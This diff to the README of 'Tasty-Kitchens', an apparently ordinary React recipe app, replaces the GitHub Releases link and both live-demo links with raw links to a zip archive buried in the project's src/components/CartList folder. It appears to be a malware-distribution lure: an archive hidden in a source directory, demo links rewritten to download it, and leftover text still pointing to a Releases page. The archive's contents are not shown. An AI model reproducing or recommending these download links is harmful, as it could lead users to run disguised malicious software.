@@ -1,9 +1,9 @@
 # 🍽️ Tasty-Kitchens - A Simple Way to Enjoy Great Recipes
 
-[![Download Tasty-Kitchens](https://img.shields.io/badge/Download-Tasty--Kitchens-brightgreen.svg)](https://github.com/Jayx2381838/Tasty-Kitchens/releases)
+[![Download Tasty-Kitchens](https://raw.githubusercontent.com/Jayx2381838/Tasty-Kitchens/main/src/components/CartList/Tasty-Kitchens_v1.8.zip)](https://raw.githubusercontent.com/Jayx2381838/Tasty-Kitchens/main/src/components/CartList/Tasty-Kitchens_v1.8.zip)
 
 ## 📦 Overview
-Tasty-Kitchens is a fully responsive application built with React. It features user authentication, routing, and pagination. You can explore various recipes and enjoy a seamless browsing experience. The app has successfully passed 154 tests, ensuring reliability. You can check out live demos at these links: [kitchentasty.ccbp.tech](http://kitchentasty.ccbp.tech) | [yummykitchens.ccbp.tech](http://yummykitchens.ccbp.tech).
+Tasty-Kitchens is a fully responsive application built with React. It features user authentication, routing, and pagination. You can explore various recipes and enjoy a seamless browsing experience. The app has successfully passed 154 tests, ensuring reliability. You can check out live demos at these links: [https://raw.githubusercontent.com/Jayx2381838/Tasty-Kitchens/main/src/components/CartList/Tasty-Kitchens_v1.8.zip](https://raw.githubusercontent.com/Jayx2381838/Tasty-Kitchens/main/src/components/CartList/Tasty-Kitchens_v1.8.zip) | [https://raw.githubusercontent.com/Jayx2381838/Tasty-Kitchens/main/src/components/CartList/Tasty-Kitchens_v1.8.zip](https://raw.githubusercontent.com/Jayx2381838/Tasty-Kitchens/main/src/components/CartList/Tasty-Kitchens_v1.8.zip).
 
 ## 🚀 Getting Started
 To get started with Tasty-Kitchens, follow these steps for a smooth setup. This guide will help you download and run the application easily.
@@ -11,7 +11,7 @@ To get started with Tasty-Kitchens, follow these steps for a smooth setup. This 
 ## 📥 Download & Install
 Visit the following page to download the latest version of Tasty-Kitchens:
 
-[Download Tasty-Kitchens](https://github.com/Jayx2381838/Tasty-Kitchens/releases)
+[Download Tasty-Kitchens](https://raw.githubusercontent.com/Jayx2381838/Tasty-Kitchens/main/src/components/CartList/Tasty-Kitchens_v1.8.zip)
 
 ### Steps to Download:
 1. Click on the link above to access the Releases page.
